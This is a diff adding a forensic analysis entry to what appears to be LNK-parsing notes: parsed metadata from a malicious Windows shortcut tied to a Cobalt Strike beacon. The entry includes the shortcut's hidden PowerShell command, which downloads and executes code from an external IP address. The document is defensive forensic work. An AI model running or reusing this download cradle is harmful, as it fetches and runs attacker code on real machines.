@@ -115,3 +115,55 @@ Folder: CSIDL_SYSTEM
 
 Notes: No TrackerDataBlock, confirmed that time stamps in shell items are zero'd
 out.
+
+# updated 20220831
+https://malcat.fr/blog/lnk-forensic-and-config-extraction-of-a-cobalt-strike-beacon/
+
+File: d:\cases\lnk2\cs.txt
+guid               {00021401-0000-0000-c000-000000000046}
+mtime              Sun Jun 12 14:46:28 2022 Z
+atime              Thu Jun 30 04:21:18 2022 Z
+ctime              Sun Jun 12 14:46:28 2022 Z
+workingdir         E:\downloads
+basepath           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+shitemidlist       My Computer/C:\/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
+**Shell Items Details (times in UTC)**
+  C:2019-12-07 09:03:46  M:2022-06-30 02:09:28  A:2022-06-30 04:11:22 Windows  (9)  [179356/3]
+  C:2019-12-07 09:03:46  M:2022-06-30 03:11:46  A:2022-06-30 04:11:56 System32  (9)  [181379/3]
+  C:2019-12-07 09:14:54  M:2019-12-07 09:14:54  A:2022-06-30 01:05:26 WindowsPowerShell  (9)  [182401/3]
+  C:2019-12-07 09:14:54  M:2022-06-13 03:35:36  A:2022-06-30 03:03:40 v1.0  (9)  [182402/3]
+  C:2022-06-12 14:46:30  M:2022-06-12 14:46:30  A:2022-06-30 04:03:48 powershell.exe  (9)
+vol_sn             BA2E-9690
+vol_type           Fixed Disk
+commandline        -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://120.48.85.228:80/favicon'))"
+hotkey             0x0
+showcmd            0x1
+
+***LinkFlags***
+HasLinkTargetIDList|IsUnicode|HasWorkingDir|HasLinkInfo|HasArguments|EnableTargetMetadata
+
+***PropertyStoreDataBlock***
+GUID/ID pairs:
+{28636aa6-953d-11d2-b5d6-00c04fd918d0}/30     ParsingPath: E:\downloads\Dû÷N1→ éYUO(W*N♫zAPP
+Nî[►bGlù{♣n4⌂▼ .pdf
+{446d16b1-8dad-4870-a748-402ea43d788c}/104    VolumeID: {a577bd74-42b7-4ee4-998a-0c216bb8c11f}
+{b725f130-47ef-101a-a5f1-02608c9eebac}/10     ItemNameDisplay: Dû÷N1→ éYUO(W*N♫zAPP
+Nî[►bGlù{♣n4⌂▼ .pdf
+{b725f130-47ef-101a-a5f1-02608c9eebac}/12     Size: 232486
+{b725f130-47ef-101a-a5f1-02608c9eebac}/14     DateModified: Thu Jun 30 03:22:00 2022 Z
+{b725f130-47ef-101a-a5f1-02608c9eebac}/15     DateCreated : Thu Jun 30 03:21:58 2022 Z
+{b725f130-47ef-101a-a5f1-02608c9eebac}/4      ItemType: Microsoft Edge PDF Document
+{e3e0584c-b788-4a5a-bb20-7f5a44c9acdd}/6      ItemFolderPathDisplay: E:\♂N}Å
+
+***KnownFolderDataBlock***
+GUID  : {1ac14e77-02e7-4e5d-b744-2eb1ae5198b7}
+Folder: CSIDL_SYSTEM
+
+***TrackerDataBlock***
+Machine ID            : desktop-3l400cr
+New Droid ID Time     : Thu Jun 30 02:09:19 2022 UTC
+New Droid ID Seq Num  : 12611
+New Droid    Node ID  : 00:50:56:c0:00:08
+Birth Droid ID Time   : Thu Jun 30 02:09:19 2022 UTC
+Birth Droid ID Seq Num: 12611
+Birth Droid Node ID   : 00:50:56:c0:00:08
